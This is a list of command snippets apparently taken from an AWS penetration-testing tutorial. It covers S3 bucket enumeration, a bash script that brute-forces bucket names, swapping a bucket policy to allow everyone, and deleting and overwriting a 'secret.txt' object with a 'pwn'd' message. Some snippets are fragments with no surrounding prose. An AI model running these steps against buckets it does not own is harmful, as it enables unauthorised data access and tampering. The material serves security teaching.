["```\n    $ aws configure\n    ```", "```\n    $ aws s3 ls s3://\n    ```", "```\n    $ aws s3 ls s3://packetawspentesting\n    ```", "```\n    $ echo \"TESTING FOR AWS PENETESTING\" > test.txt\n    ```", "```\n    $ cat test.txt\n    ```", "```\n    $ aws s3 cp test.txt s3://packtawspentesting\n    ```", "```\n    $ aws s3 ls s3://packtawspentesting\n    ```", "```\n$ aws s3api get-bucket-policy --bucket packtawspentesting \n```", "```\n$ aws s3api get-bucket-policy --bucket packtawspentesting --output text | python -m json.tool\n```", "```\n{\n\u00a0\u00a0\"Id\": \"Policy1582144841563\",\n\u00a0\u00a0\"Version\": \"2012-10-17\",\n\u00a0\u00a0\"Statement\": [\n\u00a0\u00a0\u00a0\u00a0{\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"Sid\": \"Stmt1582144836532\",\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"Action\": \"s3:*\",\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"Effect\": \"Deny\",\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"Resource\": \"arn:aws:s3:::readthisblockthis\",\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"Principal\": \"*\"\n\u00a0\u00a0\u00a0\u00a0}\n\u00a0\u00a0]\n}\n```", "```\n    $ aws s3 ls s3://\n    ```", "```\n    {\n    \u00a0\u00a0\"Id\": \"Policy1582144841563\",\n    \u00a0\u00a0\"Version\": \"2012-10-17\",\n    \u00a0\u00a0\"Statement\": [\n    \u00a0\u00a0\u00a0\u00a0{\n    \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"Sid\": \"Stmt1582144836532\",\n    \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"Action\": \"s3:*\",\n    \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"Effect\": \"Allow\",\n    \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"Resource\": \"arn:aws:s3:::readthisblockthis\",\n    \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"Principal\": \"*\"\n    \u00a0\u00a0\u00a0\u00a0}\n    \u00a0\u00a0]\n    }\n    ```", "```\n    $ aws s3api put-bucket-policy --bucket readthisblockthis\u00a0\u00a0--policy policy.json\n    ```", "```\n    awspublicpackt that seems like a possible target for public misconfigurations. Let's move forward and pull the public block from it.\n    ```", "```\n    $ aws s3api get-public-access-block --bucket awspublicpackt\n    ```", "```\n    $ pip install boto3\n    ```", "```\n    $ touch ~/.aws/credentials\n    ```", "```\n    west 2. \n    ```", "```\n    import boto3\n    s3 = boto3.resource('s3')\n    my_bucket = s3.Bucket('my_bucket_name')\n    for object_summary in my_bucket.objects.filter(Prefix=\"dir_name/\"):\n    \u00a0\u00a0\u00a0\u00a0print(object_summary.key)\n    ```", "```\n$ echo $SHELL\n```", "```\n    $ vi Buckets.sh\n    ```", "```\n#!/bin/bash\nwhile read F ; do\n\u00a0\u00a0\u00a0\u00a0count=$(curl $1/$F -s | grep -E \"NoSuchBucket|InvalidBucketName\" |wc -l)\n\u00a0\u00a0\u00a0\u00a0if [[ $count -eq 0]]\n\u00a0\u00a0\u00a0\u00a0then\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0echo \"Bucket Found: \"$F\n\u00a0\u00a0\u00a0\u00a0fi\ndone < $2\n```", "```\n    $ aws s3 ls s3://\n    ```", "```\n    $ aws s3 ls s3://the-moose-bucket-test\n    ```", "```\n    $ aws s3 cp s3://the-moose-bucket-test\n    ```", "```\n    $ cat secret.txt\n    ```", "```\n    $ aws s3api list-objects --bucket the-moose-bucket-test\n    ```", "```\n    $ aws s3api delete-object --bucket the-moose-bucket-test --key secret.txt\n    ```", "```\n    $ echo \"You have been pwn'd! Please ensure to secure your buckets!\" >> secret.txt\n    ```", "```\n    $ aws s3api put-object --bucket the-moose-bucket-test --key secret.txt\n    ```", "```\n    $ git clone https://github.com/jythontools/jython.git\n    ```", "```\n    $ git clone https://github.com/VirtueSecurity/aws-extender.git\n    ```", "```\n    $ pip install -r requirements.txt\n    ```"]